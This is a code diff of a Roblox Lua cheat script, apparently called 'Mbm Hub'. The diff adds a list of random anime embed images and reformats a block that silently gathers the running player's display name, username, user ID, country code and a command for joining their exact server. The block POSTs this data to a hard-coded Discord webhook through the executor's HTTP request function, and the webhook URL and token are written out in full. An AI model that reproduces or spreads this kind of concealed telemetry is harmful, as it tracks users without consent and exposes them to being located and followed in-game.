@@ -53,50 +53,83 @@ if game:GetService("Workspace").Map:FindFirstChild("KitsuneIsland") then
 end
 end
 
+local choices = {
+    "https://i.waifu.pics/xLoL-16.jpg", "https://i.waifu.pics/BwHGNNK.png", "https://i.waifu.pics/RBGn36s.jpeg", --1
+    "https://i.waifu.pics/hFkV1Ny.jpg", "https://i.waifu.pics/-ABlAvr.jpg", "https://i.waifu.pics/~FptP42.jpeg", --2
+    "https://i.waifu.pics/S0v1yqP.jpeg", "https://i.waifu.pics/8m-r1_O.png", "https://i.waifu.pics/tE7-FfJ.jpg", --3
+    "https://i.waifu.pics/wlvCPrF.jpg", "https://i.waifu.pics/MGCFWn1.jpg", "https://i.waifu.pics/vI9Hgee.jpg", --4
+    "https://i.waifu.pics/ueqBS0o.jpg", "https://i.waifu.pics/ZBCHHyT.jpg", "https://i.waifu.pics/rF-pZ8a.jpg", --5
+    "https://i.waifu.pics/-7c14TL.png", "https://i.waifu.pics/R5n5P7f.png", "https://i.waifu.pics/e6r~srS.png", --6
+    "https://i.waifu.pics/DxxMnby.jpg", "https://i.waifu.pics/Dci8~Lu.jpg", "https://i.waifu.pics/II9WeHB.png", --7
+    "https://i.waifu.pics/i~RQhRD.png", "https://i.waifu.pics/kYWN_ze.jpg", "https://i.waifu.pics/rzLcgTU.jpg", --8
+    "https://i.waifu.pics/vd4XAVZ.jpg", "https://i.waifu.pics/u~qTv5c.jpg", "https://i.waifu.pics/ryft10A.jpg", --9
+    "https://i.waifu.pics/1czwZu1.jpg", "https://i.waifu.pics/wNzff3p.png", "https://i.waifu.pics/_Yp1A7O.jpg", --10
+    "https://i.waifu.pics/k-akF2p.jpg", "https://i.waifu.pics/MHrvoGY.jpg", "https://i.waifu.pics/DmrSW~9.jpg", --11
+    "https://i.waifu.pics/3x~ovC6.jpg", "https://i.waifu.pics/xUYXg76.png", "https://i.waifu.pics/MxWWsnO.jpeg", --12
+    "https://i.waifu.pics/8DSLwjr.png", "https://i.waifu.pics/QQW7VKy.jpg", "https://i.waifu.pics/vwRNvPe.jpg", --13
+    "https://i.waifu.pics/fuGfYQJ.jpg", "https://i.waifu.pics/mUTwf4z.jpg", "https://i.waifu.pics/n6U5SHh.png", --14
+    "https://i.waifu.pics/Y_cKxGZ.jpg", "https://i.waifu.pics/UT0Lbfo.jpeg", "https://i.waifu.pics/EyNE0NL.jpg", --15
+    "https://i.waifu.pics/~VVdn7B.png", "https://i.waifu.pics/qjEV-At.jpg", "https://i.waifu.pics/CNzs4Pd.jpg",--16
+    "https://i.waifu.pics/-zk792B.jpg", "https://i.waifu.pics/czCeUqy.jpg", "https://i.waifu.pics/NOJicBh.png",--17
+    "https://i.waifu.pics/S0v1yqP.jpeg", "https://i.waifu.pics/3x8hEE1.png", "https://i.waifu.pics/brv-GJu.jpg",--18
+    "https://i.waifu.pics/yn_F4Nt.jpeg", "https://i.waifu.pics/Q5BE0Qt.jpg", "https://i.waifu.pics/jtKUwbl.png",--19
+    "https://i.waifu.pics/L~qlLcJ.jpg", "https://i.waifu.pics/rc2YxI-.png", "https://i.waifu.pics/bwCsw8q.jpg",--20
+    "https://i.waifu.pics/Tj6Wzwo.png", "https://i.waifu.pics/Ojsl~2a.jpg", "https://i.waifu.pics/cu~8th-.jpg", --21
+    "https://i.waifu.pics/U4WPv9I.jpg", "https://i.waifu.pics/E4jszNV.jpeg", "https://i.waifu.pics/38QXoHc.jpeg", --22
+    "https://i.waifu.pics/KJnKOgU.jpg", "https://i.waifu.pics/i1QE8~W.com_0265.jpg", "https://i.waifu.pics/7O7N6UP.png", --23
+    "https://i.waifu.pics/h15rEN_.jpg", "https://i.waifu.pics/B_Sy4E_.png", "https://i.waifu.pics/HjkIsP1.png", "https://i.waifu.pics/tZifc8D.png", --24
+    "https://i.waifu.pics/ylZ6rIU.jpg", "https://i.waifu.pics/4eSVOil.jpg", "https://i.waifu.pics/ZV7J1WW.png" --25
+}
+
+local randomIndex = math.random(1, #choices)
+local selectedDay = choices[randomIndex]
+
 local LocalizationService = game:GetService("LocalizationService")
 local player = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 
 local code = LocalizationService:GetCountryRegionForPlayerAsync(player)
 local data = {
-embeds = {
-{
-title = "Profile",
-url = "https://www.roblox.com/users/" .. player.UserId,
-description = "```" .. player.DisplayName .. " (" .. player.Name .. ") ```",
-color = tonumber(322852),
-fields = {
-{
-    name = "country",
-    value = "```Player's country code: " .. code .. "```",
-    inline = true
-},
-{
-    name = "server",
-    value = '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```',
-    inline = true
-},
-{
-    name = "ty for using",
-    value = "Main script Mbm Hub",
-    inline = true
-}
-}
-}
-}
+    embeds = {
+        {
+            title = "Profile",
+            url = "https://www.roblox.com/users/" .. player.UserId,
+            description = "```" .. player.DisplayName .. " (" .. player.Name .. ") ```",
+            color = tonumber(322852),
+            image = { url = selectedDay },
+            thumbnail = { url = "https://cdn.discordapp.com/attachments/1181972023539421204/1221706502130237510/image.png?ex=66138dd8&is=660118d8&hm=d2ec7a473f72b8cc576a00eb9052ff2fa65f7f8336c04e10bcb01a653e025e12&" },
+            fields = {
+                {
+                    name = "country",
+                    value = "```Player's country code: " .. code .. "```",
+                    inline = true
+                },
+                {
+                    name = "server",
+                    value = '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```',
+                    inline = true
+                },
+                {
+                    name = "ty for using",
+                    value = "Main script Mbm Hub",
+                    inline = true
+                }
+            }
+        }
+    }
 }
 
 local jsonData = HttpService:JSONEncode(data)
 local webhookUrl = "https://discord.com/api/webhooks/1216691153697505280/ZoRdbUTWF-IzMFCFLW-NrUoE6ZGXCrnMAFNGF8rcTPjO8QrDh1OITZYhzFKiThkdBib9"
-local headers = {["Content-Type"] = "application/json"}
+local headers = { ["Content-Type"] = "application/json" }
 local request = http_request or request or HttpPost or syn.request
-local final = {Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers}
+local final = { Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers }
 
 local success, response = pcall(request, final)
 if success then
-print("+1 User excuted")
+    print("+1 User excuted")
 else
-print("Failed to get profile user or excutor: " .. response)
+    print("executor issue: " .. response)
 end
 
 if game.PlaceId == 7449423635 then 
